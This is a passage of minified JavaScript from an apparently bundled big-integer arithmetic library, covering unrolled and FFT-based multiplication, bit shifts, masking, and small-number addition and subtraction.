                yr &= 67108863,
                re = Math.imul(Qe, rt),
                $ = Math.imul(Qe, dt),
                $ = $ + Math.imul(We, rt) | 0,
                ie = Math.imul(We, dt),
                re = re + Math.imul(nt, ft) | 0,
                $ = $ + Math.imul(nt, gt) | 0,
                $ = $ + Math.imul(je, ft) | 0,
                ie = ie + Math.imul(je, gt) | 0,
                re = re + Math.imul(qe, Ct) | 0,
                $ = $ + Math.imul(qe, Ot) | 0,
                $ = $ + Math.imul(Ve, Ct) | 0,
                ie = ie + Math.imul(Ve, Ot) | 0,
                re = re + Math.imul(Ze, Pt) | 0,
                $ = $ + Math.imul(Ze, Bt) | 0,
                $ = $ + Math.imul($e, Pt) | 0,
                ie = ie + Math.imul($e, Bt) | 0,
                re = re + Math.imul(Ie, Dt) | 0,
                $ = $ + Math.imul(Ie, Ft) | 0,
                $ = $ + Math.imul(Te, Dt) | 0,
                ie = ie + Math.imul(Te, Ft) | 0,
                re = re + Math.imul(ge, at) | 0,
                $ = $ + Math.imul(ge, ze) | 0,
                $ = $ + Math.imul(Re, at) | 0,
                ie = ie + Math.imul(Re, ze) | 0;
                var vr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (vr >>> 26) | 0,
                vr &= 67108863,
                re = Math.imul(ct, rt),
                $ = Math.imul(ct, dt),
                $ = $ + Math.imul(vt, rt) | 0,
                ie = Math.imul(vt, dt),
                re = re + Math.imul(Qe, ft) | 0,
                $ = $ + Math.imul(Qe, gt) | 0,
                $ = $ + Math.imul(We, ft) | 0,
                ie = ie + Math.imul(We, gt) | 0,
                re = re + Math.imul(nt, Ct) | 0,
                $ = $ + Math.imul(nt, Ot) | 0,
                $ = $ + Math.imul(je, Ct) | 0,
                ie = ie + Math.imul(je, Ot) | 0,
                re = re + Math.imul(qe, Pt) | 0,
                $ = $ + Math.imul(qe, Bt) | 0,
                $ = $ + Math.imul(Ve, Pt) | 0,
                ie = ie + Math.imul(Ve, Bt) | 0,
                re = re + Math.imul(Ze, Dt) | 0,
                $ = $ + Math.imul(Ze, Ft) | 0,
                $ = $ + Math.imul($e, Dt) | 0,
                ie = ie + Math.imul($e, Ft) | 0,
                re = re + Math.imul(Ie, at) | 0,
                $ = $ + Math.imul(Ie, ze) | 0,
                $ = $ + Math.imul(Te, at) | 0,
                ie = ie + Math.imul(Te, ze) | 0,
                re = re + Math.imul(ge, ht) | 0,
                $ = $ + Math.imul(ge, _t) | 0,
                $ = $ + Math.imul(Re, ht) | 0,
                ie = ie + Math.imul(Re, _t) | 0;
                var gr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (gr >>> 26) | 0,
                gr &= 67108863,
                re = Math.imul(_e, rt),
                $ = Math.imul(_e, dt),
                $ = $ + Math.imul(Ce, rt) | 0,
                ie = Math.imul(Ce, dt),
                re = re + Math.imul(ct, ft) | 0,
                $ = $ + Math.imul(ct, gt) | 0,
                $ = $ + Math.imul(vt, ft) | 0,
                ie = ie + Math.imul(vt, gt) | 0,
                re = re + Math.imul(Qe, Ct) | 0,
                $ = $ + Math.imul(Qe, Ot) | 0,
                $ = $ + Math.imul(We, Ct) | 0,
                ie = ie + Math.imul(We, Ot) | 0,
                re = re + Math.imul(nt, Pt) | 0,
                $ = $ + Math.imul(nt, Bt) | 0,
                $ = $ + Math.imul(je, Pt) | 0,
                ie = ie + Math.imul(je, Bt) | 0,
                re = re + Math.imul(qe, Dt) | 0,
                $ = $ + Math.imul(qe, Ft) | 0,
                $ = $ + Math.imul(Ve, Dt) | 0,
                ie = ie + Math.imul(Ve, Ft) | 0,
                re = re + Math.imul(Ze, at) | 0,
                $ = $ + Math.imul(Ze, ze) | 0,
                $ = $ + Math.imul($e, at) | 0,
                ie = ie + Math.imul($e, ze) | 0,
                re = re + Math.imul(Ie, ht) | 0,
                $ = $ + Math.imul(Ie, _t) | 0,
                $ = $ + Math.imul(Te, ht) | 0,
                ie = ie + Math.imul(Te, _t) | 0,
                re = re + Math.imul(ge, Ye) | 0,
                $ = $ + Math.imul(ge, it) | 0,
                $ = $ + Math.imul(Re, Ye) | 0,
                ie = ie + Math.imul(Re, it) | 0;
                var Sr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (Sr >>> 26) | 0,
                Sr &= 67108863,
                re = Math.imul(et, rt),
                $ = Math.imul(et, dt),
                $ = $ + Math.imul(tt, rt) | 0,
                ie = Math.imul(tt, dt),
                re = re + Math.imul(_e, ft) | 0,
                $ = $ + Math.imul(_e, gt) | 0,
                $ = $ + Math.imul(Ce, ft) | 0,
                ie = ie + Math.imul(Ce, gt) | 0,
                re = re + Math.imul(ct, Ct) | 0,
                $ = $ + Math.imul(ct, Ot) | 0,
                $ = $ + Math.imul(vt, Ct) | 0,
                ie = ie + Math.imul(vt, Ot) | 0,
                re = re + Math.imul(Qe, Pt) | 0,
                $ = $ + Math.imul(Qe, Bt) | 0,
                $ = $ + Math.imul(We, Pt) | 0,
                ie = ie + Math.imul(We, Bt) | 0,
                re = re + Math.imul(nt, Dt) | 0,
                $ = $ + Math.imul(nt, Ft) | 0,
                $ = $ + Math.imul(je, Dt) | 0,
                ie = ie + Math.imul(je, Ft) | 0,
                re = re + Math.imul(qe, at) | 0,
                $ = $ + Math.imul(qe, ze) | 0,
                $ = $ + Math.imul(Ve, at) | 0,
                ie = ie + Math.imul(Ve, ze) | 0,
                re = re + Math.imul(Ze, ht) | 0,
                $ = $ + Math.imul(Ze, _t) | 0,
                $ = $ + Math.imul($e, ht) | 0,
                ie = ie + Math.imul($e, _t) | 0,
                re = re + Math.imul(Ie, Ye) | 0,
                $ = $ + Math.imul(Ie, it) | 0,
                $ = $ + Math.imul(Te, Ye) | 0,
                ie = ie + Math.imul(Te, it) | 0,
                re = re + Math.imul(ge, ut) | 0,
                $ = $ + Math.imul(ge, wt) | 0,
                $ = $ + Math.imul(Re, ut) | 0,
                ie = ie + Math.imul(Re, wt) | 0;
                var br = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (br >>> 26) | 0,
                br &= 67108863,
                re = Math.imul(ke, rt),
                $ = Math.imul(ke, dt),
                $ = $ + Math.imul(Me, rt) | 0,
                ie = Math.imul(Me, dt),
                re = re + Math.imul(et, ft) | 0,
                $ = $ + Math.imul(et, gt) | 0,
                $ = $ + Math.imul(tt, ft) | 0,
                ie = ie + Math.imul(tt, gt) | 0,
                re = re + Math.imul(_e, Ct) | 0,
                $ = $ + Math.imul(_e, Ot) | 0,
                $ = $ + Math.imul(Ce, Ct) | 0,
                ie = ie + Math.imul(Ce, Ot) | 0,
                re = re + Math.imul(ct, Pt) | 0,
                $ = $ + Math.imul(ct, Bt) | 0,
                $ = $ + Math.imul(vt, Pt) | 0,
                ie = ie + Math.imul(vt, Bt) | 0,
                re = re + Math.imul(Qe, Dt) | 0,
                $ = $ + Math.imul(Qe, Ft) | 0,
                $ = $ + Math.imul(We, Dt) | 0,
                ie = ie + Math.imul(We, Ft) | 0,
                re = re + Math.imul(nt, at) | 0,
                $ = $ + Math.imul(nt, ze) | 0,
                $ = $ + Math.imul(je, at) | 0,
                ie = ie + Math.imul(je, ze) | 0,
                re = re + Math.imul(qe, ht) | 0,
                $ = $ + Math.imul(qe, _t) | 0,
                $ = $ + Math.imul(Ve, ht) | 0,
                ie = ie + Math.imul(Ve, _t) | 0,
                re = re + Math.imul(Ze, Ye) | 0,
                $ = $ + Math.imul(Ze, it) | 0,
                $ = $ + Math.imul($e, Ye) | 0,
                ie = ie + Math.imul($e, it) | 0,
                re = re + Math.imul(Ie, ut) | 0,
                $ = $ + Math.imul(Ie, wt) | 0,
                $ = $ + Math.imul(Te, ut) | 0,
                ie = ie + Math.imul(Te, wt) | 0,
                re = re + Math.imul(ge, St) | 0,
                $ = $ + Math.imul(ge, Tt) | 0,
                $ = $ + Math.imul(Re, St) | 0,
                ie = ie + Math.imul(Re, Tt) | 0;
                var _r = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (_r >>> 26) | 0,
                _r &= 67108863,
                re = Math.imul(ke, ft),
                $ = Math.imul(ke, gt),
                $ = $ + Math.imul(Me, ft) | 0,
                ie = Math.imul(Me, gt),
                re = re + Math.imul(et, Ct) | 0,
                $ = $ + Math.imul(et, Ot) | 0,
                $ = $ + Math.imul(tt, Ct) | 0,
                ie = ie + Math.imul(tt, Ot) | 0,
                re = re + Math.imul(_e, Pt) | 0,
                $ = $ + Math.imul(_e, Bt) | 0,
                $ = $ + Math.imul(Ce, Pt) | 0,
                ie = ie + Math.imul(Ce, Bt) | 0,
                re = re + Math.imul(ct, Dt) | 0,
                $ = $ + Math.imul(ct, Ft) | 0,
                $ = $ + Math.imul(vt, Dt) | 0,
                ie = ie + Math.imul(vt, Ft) | 0,
                re = re + Math.imul(Qe, at) | 0,
                $ = $ + Math.imul(Qe, ze) | 0,
                $ = $ + Math.imul(We, at) | 0,
                ie = ie + Math.imul(We, ze) | 0,
                re = re + Math.imul(nt, ht) | 0,
                $ = $ + Math.imul(nt, _t) | 0,
                $ = $ + Math.imul(je, ht) | 0,
                ie = ie + Math.imul(je, _t) | 0,
                re = re + Math.imul(qe, Ye) | 0,
                $ = $ + Math.imul(qe, it) | 0,
                $ = $ + Math.imul(Ve, Ye) | 0,
                ie = ie + Math.imul(Ve, it) | 0,
                re = re + Math.imul(Ze, ut) | 0,
                $ = $ + Math.imul(Ze, wt) | 0,
                $ = $ + Math.imul($e, ut) | 0,
                ie = ie + Math.imul($e, wt) | 0,
                re = re + Math.imul(Ie, St) | 0,
                $ = $ + Math.imul(Ie, Tt) | 0,
                $ = $ + Math.imul(Te, St) | 0,
                ie = ie + Math.imul(Te, Tt) | 0;
                var wr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (wr >>> 26) | 0,
                wr &= 67108863,
                re = Math.imul(ke, Ct),
                $ = Math.imul(ke, Ot),
                $ = $ + Math.imul(Me, Ct) | 0,
                ie = Math.imul(Me, Ot),
                re = re + Math.imul(et, Pt) | 0,
                $ = $ + Math.imul(et, Bt) | 0,
                $ = $ + Math.imul(tt, Pt) | 0,
                ie = ie + Math.imul(tt, Bt) | 0,
                re = re + Math.imul(_e, Dt) | 0,
                $ = $ + Math.imul(_e, Ft) | 0,
                $ = $ + Math.imul(Ce, Dt) | 0,
                ie = ie + Math.imul(Ce, Ft) | 0,
                re = re + Math.imul(ct, at) | 0,
                $ = $ + Math.imul(ct, ze) | 0,
                $ = $ + Math.imul(vt, at) | 0,
                ie = ie + Math.imul(vt, ze) | 0,
                re = re + Math.imul(Qe, ht) | 0,
                $ = $ + Math.imul(Qe, _t) | 0,
                $ = $ + Math.imul(We, ht) | 0,
                ie = ie + Math.imul(We, _t) | 0,
                re = re + Math.imul(nt, Ye) | 0,
                $ = $ + Math.imul(nt, it) | 0,
                $ = $ + Math.imul(je, Ye) | 0,
                ie = ie + Math.imul(je, it) | 0,
                re = re + Math.imul(qe, ut) | 0,
                $ = $ + Math.imul(qe, wt) | 0,
                $ = $ + Math.imul(Ve, ut) | 0,
                ie = ie + Math.imul(Ve, wt) | 0,
                re = re + Math.imul(Ze, St) | 0,
                $ = $ + Math.imul(Ze, Tt) | 0,
                $ = $ + Math.imul($e, St) | 0,
                ie = ie + Math.imul($e, Tt) | 0;
                var sr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (sr >>> 26) | 0,
                sr &= 67108863,
                re = Math.imul(ke, Pt),
                $ = Math.imul(ke, Bt),
                $ = $ + Math.imul(Me, Pt) | 0,
                ie = Math.imul(Me, Bt),
                re = re + Math.imul(et, Dt) | 0,
                $ = $ + Math.imul(et, Ft) | 0,
                $ = $ + Math.imul(tt, Dt) | 0,
                ie = ie + Math.imul(tt, Ft) | 0,
                re = re + Math.imul(_e, at) | 0,
                $ = $ + Math.imul(_e, ze) | 0,
                $ = $ + Math.imul(Ce, at) | 0,
                ie = ie + Math.imul(Ce, ze) | 0,
                re = re + Math.imul(ct, ht) | 0,
                $ = $ + Math.imul(ct, _t) | 0,
                $ = $ + Math.imul(vt, ht) | 0,
                ie = ie + Math.imul(vt, _t) | 0,
                re = re + Math.imul(Qe, Ye) | 0,
                $ = $ + Math.imul(Qe, it) | 0,
                $ = $ + Math.imul(We, Ye) | 0,
                ie = ie + Math.imul(We, it) | 0,
                re = re + Math.imul(nt, ut) | 0,
                $ = $ + Math.imul(nt, wt) | 0,
                $ = $ + Math.imul(je, ut) | 0,
                ie = ie + Math.imul(je, wt) | 0,
                re = re + Math.imul(qe, St) | 0,
                $ = $ + Math.imul(qe, Tt) | 0,
                $ = $ + Math.imul(Ve, St) | 0,
                ie = ie + Math.imul(Ve, Tt) | 0;
                var dr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (dr >>> 26) | 0,
                dr &= 67108863,
                re = Math.imul(ke, Dt),
                $ = Math.imul(ke, Ft),
                $ = $ + Math.imul(Me, Dt) | 0,
                ie = Math.imul(Me, Ft),
                re = re + Math.imul(et, at) | 0,
                $ = $ + Math.imul(et, ze) | 0,
                $ = $ + Math.imul(tt, at) | 0,
                ie = ie + Math.imul(tt, ze) | 0,
                re = re + Math.imul(_e, ht) | 0,
                $ = $ + Math.imul(_e, _t) | 0,
                $ = $ + Math.imul(Ce, ht) | 0,
                ie = ie + Math.imul(Ce, _t) | 0,
                re = re + Math.imul(ct, Ye) | 0,
                $ = $ + Math.imul(ct, it) | 0,
                $ = $ + Math.imul(vt, Ye) | 0,
                ie = ie + Math.imul(vt, it) | 0,
                re = re + Math.imul(Qe, ut) | 0,
                $ = $ + Math.imul(Qe, wt) | 0,
                $ = $ + Math.imul(We, ut) | 0,
                ie = ie + Math.imul(We, wt) | 0,
                re = re + Math.imul(nt, St) | 0,
                $ = $ + Math.imul(nt, Tt) | 0,
                $ = $ + Math.imul(je, St) | 0,
                ie = ie + Math.imul(je, Tt) | 0;
                var nr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (nr >>> 26) | 0,
                nr &= 67108863,
                re = Math.imul(ke, at),
                $ = Math.imul(ke, ze),
                $ = $ + Math.imul(Me, at) | 0,
                ie = Math.imul(Me, ze),
                re = re + Math.imul(et, ht) | 0,
                $ = $ + Math.imul(et, _t) | 0,
                $ = $ + Math.imul(tt, ht) | 0,
                ie = ie + Math.imul(tt, _t) | 0,
                re = re + Math.imul(_e, Ye) | 0,
                $ = $ + Math.imul(_e, it) | 0,
                $ = $ + Math.imul(Ce, Ye) | 0,
                ie = ie + Math.imul(Ce, it) | 0,
                re = re + Math.imul(ct, ut) | 0,
                $ = $ + Math.imul(ct, wt) | 0,
                $ = $ + Math.imul(vt, ut) | 0,
                ie = ie + Math.imul(vt, wt) | 0,
                re = re + Math.imul(Qe, St) | 0,
                $ = $ + Math.imul(Qe, Tt) | 0,
                $ = $ + Math.imul(We, St) | 0,
                ie = ie + Math.imul(We, Tt) | 0;
                var lr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (lr >>> 26) | 0,
                lr &= 67108863,
                re = Math.imul(ke, ht),
                $ = Math.imul(ke, _t),
                $ = $ + Math.imul(Me, ht) | 0,
                ie = Math.imul(Me, _t),
                re = re + Math.imul(et, Ye) | 0,
                $ = $ + Math.imul(et, it) | 0,
                $ = $ + Math.imul(tt, Ye) | 0,
                ie = ie + Math.imul(tt, it) | 0,
                re = re + Math.imul(_e, ut) | 0,
                $ = $ + Math.imul(_e, wt) | 0,
                $ = $ + Math.imul(Ce, ut) | 0,
                ie = ie + Math.imul(Ce, wt) | 0,
                re = re + Math.imul(ct, St) | 0,
                $ = $ + Math.imul(ct, Tt) | 0,
                $ = $ + Math.imul(vt, St) | 0,
                ie = ie + Math.imul(vt, Tt) | 0;
                var fr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (fr >>> 26) | 0,
                fr &= 67108863,
                re = Math.imul(ke, Ye),
                $ = Math.imul(ke, it),
                $ = $ + Math.imul(Me, Ye) | 0,
                ie = Math.imul(Me, it),
                re = re + Math.imul(et, ut) | 0,
                $ = $ + Math.imul(et, wt) | 0,
                $ = $ + Math.imul(tt, ut) | 0,
                ie = ie + Math.imul(tt, wt) | 0,
                re = re + Math.imul(_e, St) | 0,
                $ = $ + Math.imul(_e, Tt) | 0,
                $ = $ + Math.imul(Ce, St) | 0,
                ie = ie + Math.imul(Ce, Tt) | 0;
                var ir = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (ir >>> 26) | 0,
                ir &= 67108863,
                re = Math.imul(ke, ut),
                $ = Math.imul(ke, wt),
                $ = $ + Math.imul(Me, ut) | 0,
                ie = Math.imul(Me, wt),
                re = re + Math.imul(et, St) | 0,
                $ = $ + Math.imul(et, Tt) | 0,
                $ = $ + Math.imul(tt, St) | 0,
                ie = ie + Math.imul(tt, Tt) | 0;
                var $t = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + ($t >>> 26) | 0,
                $t &= 67108863,
                re = Math.imul(ke, St),
                $ = Math.imul(ke, Tt),
                $ = $ + Math.imul(Me, St) | 0,
                ie = Math.imul(Me, Tt);
                var Nt = (de + re | 0) + (($ & 8191) << 13) | 0;
                return de = (ie + ($ >>> 13) | 0) + (Nt >>> 26) | 0,
                Nt &= 67108863,
                se[0] = er,
                se[1] = Xt,
                se[2] = pr,
                se[3] = or,
                se[4] = yr,
                se[5] = vr,
                se[6] = gr,
                se[7] = Sr,
                se[8] = br,
                se[9] = _r,
                se[10] = wr,
                se[11] = sr,
                se[12] = dr,
                se[13] = nr,
                se[14] = lr,
                se[15] = fr,
                se[16] = ir,
                se[17] = $t,
                se[18] = Nt,
                de !== 0 && (se[19] = de,
                U.length++),
                U
            };
            Math.imul || (ne = ae);
            function oe(ce, q, L) {
                L.negative = q.negative ^ ce.negative,
                L.length = ce.length + q.length;
                for (var U = 0, Z = 0, te = 0; te < L.length - 1; te++) {
                    var se = Z;
                    Z = 0;
                    for (var de = U & 67108863, re = Math.min(te, q.length - 1), $ = Math.max(0, te - ce.length + 1); $ <= re; $++) {
                        var ie = te - $
                          , ve = ce.words[ie] | 0
                          , ge = q.words[$] | 0
                          , Re = ve * ge
                          , Pe = Re & 67108863;
                        se = se + (Re / 67108864 | 0) | 0,
                        Pe = Pe + de | 0,
                        de = Pe & 67108863,
                        se = se + (Pe >>> 26) | 0,
                        Z += se >>> 26,
                        se &= 67108863
                    }
                    L.words[te] = de,
                    U = se,
                    se = Z
                }
                return U !== 0 ? L.words[te] = U : L.length--,
                L.strip()
            }
            function ue(ce, q, L) {
                var U = new fe;
                return U.mulp(ce, q, L)
            }
            w.prototype.mulTo = function(q, L) {
                var U, Z = this.length + q.length;
                return this.length === 10 && q.length === 10 ? U = ne(this, q, L) : Z < 63 ? U = ae(this, q, L) : Z < 1024 ? U = oe(this, q, L) : U = ue(this, q, L),
                U
            }
            ;
            function fe(ce, q) {
                this.x = ce,
                this.y = q
            }
            fe.prototype.makeRBT = function(q) {
                for (var L = new Array(q), U = w.prototype._countBits(q) - 1, Z = 0; Z < q; Z++)
                    L[Z] = this.revBin(Z, U, q);
                return L
            }
            ,
            fe.prototype.revBin = function(q, L, U) {
                if (q === 0 || q === U - 1)
                    return q;
                for (var Z = 0, te = 0; te < L; te++)
                    Z |= (q & 1) << L - te - 1,
                    q >>= 1;
                return Z
            }
            ,
            fe.prototype.permute = function(q, L, U, Z, te, se) {
                for (var de = 0; de < se; de++)
                    Z[de] = L[q[de]],
                    te[de] = U[q[de]]
            }
            ,
            fe.prototype.transform = function(q, L, U, Z, te, se) {
                this.permute(se, q, L, U, Z, te);
                for (var de = 1; de < te; de <<= 1)
                    for (var re = de << 1, $ = Math.cos(2 * Math.PI / re), ie = Math.sin(2 * Math.PI / re), ve = 0; ve < te; ve += re)
                        for (var ge = $, Re = ie, Pe = 0; Pe < de; Pe++) {
                            var Ie = U[ve + Pe]
                              , Te = Z[ve + Pe]
                              , Le = U[ve + Pe + de]
                              , Ze = Z[ve + Pe + de]
                              , $e = ge * Le - Re * Ze;
                            Ze = ge * Ze + Re * Le,
                            Le = $e,
                            U[ve + Pe] = Ie + Le,
                            Z[ve + Pe] = Te + Ze,
                            U[ve + Pe + de] = Ie - Le,
                            Z[ve + Pe + de] = Te - Ze,
                            Pe !== re && ($e = $ * ge - ie * Re,
                            Re = $ * Re + ie * ge,
                            ge = $e)
                        }
            }
            ,
            fe.prototype.guessLen13b = function(q, L) {
                var U = Math.max(L, q) | 1
                  , Z = U & 1
                  , te = 0;
                for (U = U / 2 | 0; U; U = U >>> 1)
                    te++;
                return 1 << te + 1 + Z
            }
            ,
            fe.prototype.conjugate = function(q, L, U) {
                if (!(U <= 1))
                    for (var Z = 0; Z < U / 2; Z++) {
                        var te = q[Z];
                        q[Z] = q[U - Z - 1],
                        q[U - Z - 1] = te,
                        te = L[Z],
                        L[Z] = -L[U - Z - 1],
                        L[U - Z - 1] = -te
                    }
            }
            ,
            fe.prototype.normalize13b = function(q, L) {
                for (var U = 0, Z = 0; Z < L / 2; Z++) {
                    var te = Math.round(q[2 * Z + 1] / L) * 8192 + Math.round(q[2 * Z] / L) + U;
                    q[Z] = te & 67108863,
                    te < 67108864 ? U = 0 : U = te / 67108864 | 0
                }
                return q
            }
            ,
            fe.prototype.convert13b = function(q, L, U, Z) {
                for (var te = 0, se = 0; se < L; se++)
                    te = te + (q[se] | 0),
                    U[2 * se] = te & 8191,
                    te = te >>> 13,
                    U[2 * se + 1] = te & 8191,
                    te = te >>> 13;
                for (se = 2 * L; se < Z; ++se)
                    U[se] = 0;
                O(te === 0),
                O((te & -8192) === 0)
            }
            ,
            fe.prototype.stub = function(q) {
                for (var L = new Array(q), U = 0; U < q; U++)
                    L[U] = 0;
                return L
            }
            ,
            fe.prototype.mulp = function(q, L, U) {
                var Z = 2 * this.guessLen13b(q.length, L.length)
                  , te = this.makeRBT(Z)
                  , se = this.stub(Z)
                  , de = new Array(Z)
                  , re = new Array(Z)
                  , $ = new Array(Z)
                  , ie = new Array(Z)
                  , ve = new Array(Z)
                  , ge = new Array(Z)
                  , Re = U.words;
                Re.length = Z,
                this.convert13b(q.words, q.length, de, Z),
                this.convert13b(L.words, L.length, ie, Z),
                this.transform(de, se, re, $, Z, te),
                this.transform(ie, se, ve, ge, Z, te);
                for (var Pe = 0; Pe < Z; Pe++) {
                    var Ie = re[Pe] * ve[Pe] - $[Pe] * ge[Pe];
                    $[Pe] = re[Pe] * ge[Pe] + $[Pe] * ve[Pe],
                    re[Pe] = Ie
                }
                return this.conjugate(re, $, Z),
                this.transform(re, $, Re, se, Z, te),
                this.conjugate(Re, se, Z),
                this.normalize13b(Re, Z),
                U.negative = q.negative ^ L.negative,
                U.length = q.length + L.length,
                U.strip()
            }
            ,
            w.prototype.mul = function(q) {
                var L = new w(null);
                return L.words = new Array(this.length + q.length),
                this.mulTo(q, L)
            }
            ,
            w.prototype.mulf = function(q) {
                var L = new w(null);
                return L.words = new Array(this.length + q.length),
                ue(this, q, L)
            }
            ,
            w.prototype.imul = function(q) {
                return this.clone().mulTo(q, this)
            }
            ,
            w.prototype.imuln = function(q) {
                O(typeof q == "number"),
                O(q < 67108864);
                for (var L = 0, U = 0; U < this.length; U++) {
                    var Z = (this.words[U] | 0) * q
                      , te = (Z & 67108863) + (L & 67108863);
                    L >>= 26,
                    L += Z / 67108864 | 0,
                    L += te >>> 26,
                    this.words[U] = te & 67108863
                }
                return L !== 0 && (this.words[U] = L,
                this.length++),
                this.length = q === 0 ? 1 : this.length,
                this
            }
            ,
            w.prototype.muln = function(q) {
                return this.clone().imuln(q)
            }
            ,
            w.prototype.sqr = function() {
                return this.mul(this)
            }
            ,
            w.prototype.isqr = function() {
                return this.imul(this.clone())
            }
            ,
            w.prototype.pow = function(q) {
                var L = ee(q);
                if (L.length === 0)
                    return new w(1);
                for (var U = this, Z = 0; Z < L.length && L[Z] === 0; Z++,
                U = U.sqr())
                    ;
                if (++Z < L.length)
                    for (var te = U.sqr(); Z < L.length; Z++,
                    te = te.sqr())
                        L[Z] !== 0 && (U = U.mul(te));
                return U
            }
            ,
            w.prototype.iushln = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = q % 26, U = (q - L) / 26, Z = 67108863 >>> 26 - L << 26 - L, te;
                if (L !== 0) {
                    var se = 0;
                    for (te = 0; te < this.length; te++) {
                        var de = this.words[te] & Z
                          , re = (this.words[te] | 0) - de << L;
                        this.words[te] = re | se,
                        se = de >>> 26 - L
                    }
                    se && (this.words[te] = se,
                    this.length++)
                }
                if (U !== 0) {
                    for (te = this.length - 1; te >= 0; te--)
                        this.words[te + U] = this.words[te];
                    for (te = 0; te < U; te++)
                        this.words[te] = 0;
                    this.length += U
                }
                return this.strip()
            }
            ,
            w.prototype.ishln = function(q) {
                return O(this.negative === 0),
                this.iushln(q)
            }
            ,
            w.prototype.iushrn = function(q, L, U) {
                O(typeof q == "number" && q >= 0);
                var Z;
                L ? Z = (L - L % 26) / 26 : Z = 0;
                var te = q % 26
                  , se = Math.min((q - te) / 26, this.length)
                  , de = 67108863 ^ 67108863 >>> te << te
                  , re = U;
                if (Z -= se,
                Z = Math.max(0, Z),
                re) {
                    for (var $ = 0; $ < se; $++)
                        re.words[$] = this.words[$];
                    re.length = se
                }
                if (se !== 0)
                    if (this.length > se)
                        for (this.length -= se,
                        $ = 0; $ < this.length; $++)
                            this.words[$] = this.words[$ + se];
                    else
                        this.words[0] = 0,
                        this.length = 1;
                var ie = 0;
                for ($ = this.length - 1; $ >= 0 && (ie !== 0 || $ >= Z); $--) {
                    var ve = this.words[$] | 0;
                    this.words[$] = ie << 26 - te | ve >>> te,
                    ie = ve & de
                }
                return re && ie !== 0 && (re.words[re.length++] = ie),
                this.length === 0 && (this.words[0] = 0,
                this.length = 1),
                this.strip()
            }
            ,
            w.prototype.ishrn = function(q, L, U) {
                return O(this.negative === 0),
                this.iushrn(q, L, U)
            }
            ,
            w.prototype.shln = function(q) {
                return this.clone().ishln(q)
            }
            ,
            w.prototype.ushln = function(q) {
                return this.clone().iushln(q)
            }
            ,
            w.prototype.shrn = function(q) {
                return this.clone().ishrn(q)
            }
            ,
            w.prototype.ushrn = function(q) {
                return this.clone().iushrn(q)
            }
            ,
            w.prototype.testn = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = q % 26
                  , U = (q - L) / 26
                  , Z = 1 << L;
                if (this.length <= U)
                    return !1;
                var te = this.words[U];
                return !!(te & Z)
            }
            ,
            w.prototype.imaskn = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = q % 26
                  , U = (q - L) / 26;
                if (O(this.negative === 0, "imaskn works only with positive numbers"),
                this.length <= U)
                    return this;
                if (L !== 0 && U++,
                this.length = Math.min(U, this.length),
                L !== 0) {
                    var Z = 67108863 ^ 67108863 >>> L << L;
                    this.words[this.length - 1] &= Z
                }
                return this.strip()
            }
            ,
            w.prototype.maskn = function(q) {
                return this.clone().imaskn(q)
            }
            ,
            w.prototype.iaddn = function(q) {
                return O(typeof q == "number"),
                O(q < 67108864),
                q < 0 ? this.isubn(-q) : this.negative !== 0 ? this.length === 1 && (this.words[0] | 0) < q ? (this.words[0] = q - (this.words[0] | 0),
                this.negative = 0,
                this) : (this.negative = 0,
                this.isubn(q),
                this.negative = 1,
                this) : this._iaddn(q)
            }
            ,
            w.prototype._iaddn = function(q) {
                this.words[0] += q;
                for (var L = 0; L < this.length && this.words[L] >= 67108864; L++)
                    this.words[L] -= 67108864,
                    L === this.length - 1 ? this.words[L + 1] = 1 : this.words[L + 1]++;
                return this.length = Math.max(this.length, L + 1),
                this
            }
            ,
            w.prototype.isubn = function(q) {
                if (O(typeof q == "number"),
                O(q < 67108864),
                q < 0)
                    return this.iaddn(-q);
                if (this.negative !== 0)
                    return this.negative = 0,
                    this.iaddn(q),
                    this.negative = 1,
                    this;
                if (this.words[0] -= q,
                this.length === 1 && this.words[0] < 0)
                    this.words[0] = -this.words[0],
                    this.negative = 1;
                else
                    for (var L = 0; L < this.length && this.words[L] < 0; L++)
                        this.words[L] += 67108864,
                        this.words[L + 1] -= 1;
                return this.strip()
            }
            ,
            w.prototype.addn = function(q) {
                return this.clone().iaddn(q)
            }
            ,
            w.prototype.subn = function(q) {
                return this.clone().isubn(q)
            }
            ,
            w.prototype.iabs = function() {
                return this.negative = 0,
                this
            }
            ,
            w.prototype.abs = function() {
                return this.clone().iabs()
            }
            ,
            w.prototype._ishlnsubmul = function(q, L, U) {
                var Z = q.length + U, te;
                this._expand(Z);
                var se, de = 0;
                for (te = 0; te < q.length; te++) {
                    se = (this.words[te + U] | 0) + de;
                    var re = (q.words[te] | 0) * L;
                    se -= re & 67108863,
                    de = (se >> 26) - (re / 67108864 | 0),
                    this.words[te + U] = se & 67108863
                }
                for (; te < this.length - U; te++)
                    se = (this.words[te + U] | 0) + de,
                    de = se >> 26,
                    this.words[te + U] = se & 67108863;
                if (de === 0)
                    return this.strip();
                for (O(de === -1),
                de = 0,
                te = 0; te < this.length; te++)
                    se = -(this.words[te] | 0) + de,
                    de = se >> 26,
                    this.words[te] = se & 67108863;
                return this.negative = 1,
                this.strip()
            }
            ,
            w.prototype._wordDiv = function(q, L) {
                var U = this.length - q.length
                  , Z = this.clone()
                  , te = q
                  , se = te.words[te.length - 1] | 0
                  , de = this._countBits(se);
                U = 26 - de,
                U !== 0 && (te = te.ushln(U),
